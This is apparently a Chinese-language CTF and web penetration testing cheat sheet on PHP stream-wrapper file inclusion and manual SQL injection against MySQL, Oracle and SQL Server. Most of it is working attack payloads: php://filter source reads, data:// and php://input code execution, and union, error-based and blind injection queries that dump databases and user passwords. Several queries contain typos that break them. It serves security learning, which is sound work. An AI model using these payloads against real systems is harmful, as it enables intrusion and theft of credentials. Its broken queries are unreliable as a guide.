## web

关于Web的敏感文件有：
1. robots.txt文件是一种叫做robots的协议。其文件常在网站根目录下。告诉网络爬虫，哪些文件或者文件夹可以被网络爬虫获取。哪些文件不可以被网络爬虫获取。
2. readme.md是一种以MarkeDown格式书写的文件。通常记录一些CMS版本的信息。部分提供其CMS的GitHub地址。
3. www.zip/rar/tar.gz 是一种压缩包格式的文件。
4. index.php或者index.php~


### Web渗透信息收集

系统漏洞-->中间件漏洞-->web漏洞

信息收集分为主动收集和被动收集。主动收集是与目标主机进行直接交互，从而获取所需的目标信息。被动信息收集是不与目标主机进行直接交互，通过搜索引擎等方式间接的获取目标主机的信息。


### PHP伪协议

具体题目：[[极客大挑战 2019]Secret File 1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)

经验一：看到flag.php应该联想到php伪协议，读取文件源码：
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

#### file://协议

1. file://[文件的绝对路径和文件名]
```
http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958344-118408cf-3ecf-409b-a9e3-0de13e81ad04.png)

2. 文件相对路径和文件名

```
http://127.0.0.1/include.php?file=./phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958372-33d4b647-0a55-4a83-a501-a64e09be9ac5.png)

3. http：//网络路径和文件名

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

#### php://协议

php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。

![image](https://user-images.githubusercontent.com/27406337/164958421-551240a5-a32d-4ba0-9647-b49249d7b652.png)

- php://filter参数详解

|php://filter参数|描述|
|--|--|
|resource=<要过滤的数据流>|必须项。它指定了你要筛选过滤的数据流。|
|read=<读链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\*\	\*）分隔。|
|write=<写链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\	）分隔。|
|<; 两个链的过滤器>|任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。|

- 可用过滤器列表

![image](https://user-images.githubusercontent.com/27406337/164958515-4a04a3bc-af3e-49a9-9c95-846a42ddcd3b.png)

![image](https://user-images.githubusercontent.com/27406337/164958521-b3afecca-fc6a-4713-a62e-e794b952389f.png)

![image](https://user-images.githubusercontent.com/27406337/164958525-bef470eb-29cc-47da-a681-ae339bf51eb8.png)


示例：
1. php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）

```
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```
![image](https://user-images.githubusercontent.com/27406337/164958549-0cf1d547-7d4c-440b-9b89-0331421b0a28.png)

2. php://input + [POST DATA]执行php代码

![image](https://user-images.githubusercontent.com/27406337/164958567-e44b6312-a113-45e4-99b4-f37e51d22d50.png)


#### zip:// & bzip2:// & zlib:// 协议

zip:// & bzip2:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

1. zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传。
```
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958598-225defff-d965-4635-9d89-41ce0ea99368.png)

2. compress.bzip2://file.bz2
压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
```
http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
```
![image](https://user-images.githubusercontent.com/27406337/164958616-3a68cc6e-0d0a-49ac-90dc-d62b27bac2c5.png)

3. compress.zlib://file.gz
压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

```
http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
```
![image](https://user-images.githubusercontent.com/27406337/164958634-5e1c0d25-1fdf-4365-b397-4d681478eef8.png)


#### data:// 协议

1. data://text/plain,
```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```
![image](https://user-images.githubusercontent.com/27406337/164958676-eff4ed97-11d3-4ae4-9b6c-e1312cc2049c.png)

2. data://text/plain;base64,
```
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

![image](https://user-images.githubusercontent.com/27406337/164958688-3ee35831-d69e-4a93-9d36-75004b68eb60.png)

3. http:// & https:// 协议
```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958699-f71aec6e-6a94-4875-8bb0-d6d2777afa4e.png)

#### phar:// 协议

```
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958709-ef7ff286-01b0-48ef-884f-f628b1c249bf.png)


参考：[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)

### Sql注入

#### 0x01 Mysql 手工注入

##### 联合注入

```
?id=1' order by 4--+
?id=0' union select 1,2,3,database()--+
?id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+
?id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name="users" --+
#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name

?id=0' union select 1,2,3,group_concat(password) from users --+
#group_concat 可替换为 concat_ws(',',id,users,password )

?id=0' union select 1,2,3,password from users limit 0,1--+
```

##### **报错注入**

```
1.floor()
select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2.extractvalue()
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3.updatexml()
select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4.geometrycollection()
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5.multipoint()
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

6.polygon()
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));

7.multipolygon()
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));

8.linestring()
select * from test where id=1 and linestring((select * from(select * from(select user())a)b));

9.multilinestring()
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));

10.exp()
select * from test where id=1 and exp(~(select * from(select user())a));
```

每个一个报错语句都有它的原理：

exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。

updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。

```
爆库：?id=1' and updatexml(1,(select concat(0x7e,(schema_name),0x7e) from information_schema.schemata limit 2,1),1) -- +
爆表：?id=1' and updatexml(1,(select concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +
爆字段：?id=1' and updatexml(1,(select concat(0x7e,(column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
爆数据：?id=1' and updatexml(1,(select concat(0x7e,password,0x7e) from users limit 1,1),1) -- +

#concat 也可以放在外面 updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)
```

这里需要注意的是它加了连接字符，导致数据中的 md5 只能爆出 31 位，这里可以用分割函数分割出来：

```
substr(string string,num start,num length);
#string为字符串,start为起始位置,length为长度

?id=1' and updatexml(1,concat(0x7e, substr((select password from users limit 1,1),1,16),0x7e),1) -- +
```

##### 盲注

###### 时间盲注

时间盲注也叫延时注入 一般用到函数 sleep() BENCHMARK() 还可以使用笛卡尔积(尽量不要使用,内容太多会很慢很慢)

一般时间盲注我们还需要使用条件判断函数

```
#if（expre1，expre2，expre3）
当 expre1 为 true 时，返回 expre2，false 时，返回 expre3

#盲注的同时也配合着 mysql 提供的分割函
substr、substring、left
```

我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号，常用到的就有 ascii() hex() 等等

```
?id=1' and if(ascii(substr(database(),1,1))>115,1,sleep(5))--+
?id=1' and if((substr((select user()),1,1)='r'),sleep(5),1)--+
```

###### **布尔盲注**

```
?id=1' and substr((select user()),1,1)='r' -- +
?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +
#如果 IFNULL 第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值

?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +
#若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1
```

##### insert,delete,update

insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，一般这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方,同时这种注入不报错一般较难发现，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入

##### 二次注入与宽字节注入

二次注入的语句：在没有被单引号包裹的sql语句下，我们可以用16进制编码他，这样就不会带有单引号等。

二次注入在没有源码的情况比较难发现，通常见于注册，登录恶意账户后，数据库可能会因为恶意账户名的问题，将 admin'--+ 误认为 admin 账户

宽字节注入：针对目标做了一定的防护，单引号转变为 `\'`, mysql 会将 `\`编码为 `%5c`，宽字节中两个字节代表一个汉字，所以把 `%df`加上 `%5c`就变成了一个汉字“運”，使用这种方法成功绕过转义，就是所谓的宽字节注入。

### Oracle 手工注入

#### 联合注入

```
?id=-1' union select user,null from dual--
?id=-1' union select version,null from v$instance--
?id=-1' union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit=3)--
?id=-1' union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=2)--
?id=-1' union select username,passwd from users--
?id=-1' union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit=3)--
```

#### 报错注入

```
?id=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where banner like 'Oracle%))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select table_name from (select rownum as limit,table_name from user_tables) where limit= 3))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=3))--
?id=1' and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))--
```

### SQL server 手工注入

#### 联合注入

```
?id=-1' union select null,null--
?id=-1' union select @@servername, @@version--
?id=-1' union select db_name(),suser_sname()--
?id=-1' union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
?id=-1' union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
?id--1' union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
?id=-1' union select (select top 1 column name from information_schema.columns where table_name='users' and column_name not in (select top 1 column_name from information_schema.columns where table_name = 'users')),null---
?id=-1' union select (select top 1 username from users where username not in (select top 3 username from users)),null--
```

#### 报错注入

```
?id=1' and 1=(select 1/@@servername)--
?id=1' and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--
```

